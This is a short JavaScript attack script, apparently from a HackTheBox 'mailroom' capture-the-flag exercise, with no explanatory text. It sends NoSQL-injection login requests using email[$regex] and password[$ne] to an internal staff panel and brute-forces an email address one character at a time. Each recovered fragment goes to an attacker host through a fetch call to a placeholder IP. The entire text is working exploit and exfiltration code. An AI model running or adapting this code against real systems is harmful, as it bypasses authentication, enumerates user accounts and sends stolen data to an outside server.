async function callAuth(mail) {
	var content = await fetch("http://staff-review-panel.mailroom.htb/auth.php", {
		"headers": {
			"content-type": "application/x-www-form-urlencoded"
		},
		"body": "email[$regex]=.*" + mail + "@mailroom.htb&password[$ne]=abc",
		"method": "POST"
	}).then(function (res) {
		return res.text();
	});
	return { d: mail, c: /"success":true/.test(content) }
}
function notify(pass) {
	fetch("http://<IP>/"+pass, {});
}
var chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~";
function cal(chars, mail) {
	for (var i = 0; i < chars.length; i++) {
		callAuth(chars[i]+mail).then(function (item) {
			if (item.c) {
                notify(item.d);
				cal("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%'()+, -/:;<=>@[\]_`{}~", item.d);
			}
		});
	}
}
cal(chars, "");